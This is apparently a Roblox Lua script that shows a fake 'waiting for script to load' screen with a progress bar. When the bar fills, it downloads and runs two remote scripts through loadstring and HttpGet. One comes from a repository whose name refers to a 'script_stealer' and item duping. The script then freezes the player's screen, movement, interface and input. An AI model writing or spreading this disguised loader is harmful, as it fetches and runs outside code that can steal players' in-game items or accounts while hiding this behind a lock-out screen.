-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CrashWaitingUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Transparent fullscreen Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Loading message
local textLabel = Instance.new("TextLabel")
textLabel.Text = "**WAITING FOR SYPHINX SCRIPT TO LOAD..."
textLabel.Size = UDim2.new(1, 0, 0.1, 0)
textLabel.Position = UDim2.new(0, 0, 0.4, 0)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.BackgroundTransparency = 1
textLabel.Parent = frame

-- Spinner icon
local loadingImage = Instance.new("ImageLabel")
loadingImage.Size = UDim2.new(0, 50, 0, 50)
loadingImage.Position = UDim2.new(0.5, -25, 0.52, 0)
loadingImage.BackgroundTransparency = 1
loadingImage.Image = "rbxassetid://7733960981"
loadingImage.Parent = frame

-- Loading bar background
local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(0.4, 0, 0.025, 0)
barBackground.Position = UDim2.new(0.3, 0, 0.6, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barBackground.BorderSizePixel = 0
barBackground.Parent = frame

-- Loading bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBackground

-- Animate spinner
local angle = 0
RunService.RenderStepped:Connect(function(deltaTime)
    angle = angle + 180 * deltaTime
    loadingImage.Rotation = angle % 360
end)

-- Animate loading bar over 20 seconds
local goal = { Size = UDim2.new(1, 0, 1, 0) }
local tweenInfo = TweenInfo.new(20, Enum.EasingStyle.Linear)
local tween = TweenService:Create(barFill, tweenInfo, goal)
tween:Play()

-- When loading completes, fade out and freeze
tween.Completed:Connect(function()
    -- Fade out UI
    for t = 0, 1, 0.05 do
        textLabel.TextTransparency = t
        textLabel.TextStrokeTransparency = t
        loadingImage.ImageTransparency = t
        barBackground.BackgroundTransparency = t
        barFill.BackgroundTransparency = t
        wait(0.05)
    end
    screenGui:Destroy()

    -- Execute external scripts
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Letsbegin2/growagarden.script_stealer.fruit-player-dupe.pets-schekles/refs/heads/main/Petspawnerscriptss"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    Spawner.Load()

    -- Freeze screen and input
    local freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeScreen"
    freezeGui.ResetOnSpawn = false
    freezeGui.IgnoreGuiInset = true
    freezeGui.Parent = player:WaitForChild("PlayerGui")

    local freezeFrame = Instance.new("Frame")
    freezeFrame.Size = UDim2.new(1, 0, 1, 0)
    freezeFrame.Position = UDim2.new(0, 0, 0, 0)
    freezeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    freezeFrame.BackgroundTransparency = 0.5
    freezeFrame.Modal = true
    freezeFrame.Parent = freezeGui

    local message = Instance.new("TextLabel")
    message.Size = UDim2.new(1, 0, 0.2, 0)
    message.Position = UDim2.new(0, 0, 0.4, 0)
    message.Text = "You are frozen!"
    message.TextColor3 = Color3.new(1, 1, 1)
    message.BackgroundTransparency = 1
    message.Font = Enum.Font.SourceSansBold
    message.TextScaled = true
    message.Parent = freezeFrame

    -- Lock camera
    camera.CameraType = Enum.CameraType.Scriptable

    -- Disable movement
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0

    -- Disable CoreGui
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)

    -- Block input
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if freezeFrame.Visible then
            return Enum.ContextActionResult.Sink
        end
    end)
end)
